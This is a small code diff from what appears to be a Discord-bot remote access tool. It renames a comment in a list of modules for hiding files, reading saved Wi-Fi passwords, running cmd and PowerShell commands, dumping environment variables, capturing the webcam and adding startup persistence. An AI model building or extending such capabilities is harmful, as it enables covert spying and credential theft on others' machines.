@@ -151,7 +151,7 @@ class closeall_confirm(discord.ui.View):
 extensions = (
     "hide",           # /hidefile & /unhidefile
     "wifi",           # /wifilist & /wifipass
-    "shell",          # /shell
+    "shell",          # /cmd & /powershell
     "getenv",         # /get_environment
     "webcam",         # /get_webcam
     "startup",        # /startup
